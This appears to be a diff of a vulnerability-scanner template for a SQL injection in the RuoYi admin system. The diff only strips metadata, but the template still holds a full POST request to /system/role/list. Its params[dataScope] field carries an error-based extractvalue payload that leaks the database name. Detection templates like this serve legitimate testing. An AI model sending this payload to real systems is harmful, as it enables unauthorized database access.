@@ -3,12 +3,8 @@ info:
   name: 若依RuoYi系统 sql注入1
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lcu9v7dmzqczv194'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lcu9v7dmzqczv194
-    fofa: 暂无
 http:
 - raw:
   - 'POST /system/role/list HTTP/1.1
@@ -45,8 +41,6 @@ http:
 
 
     Connection: close
-
-
 
 
     pageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=&status=&params[beginTime]=&params[endTime]=&params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
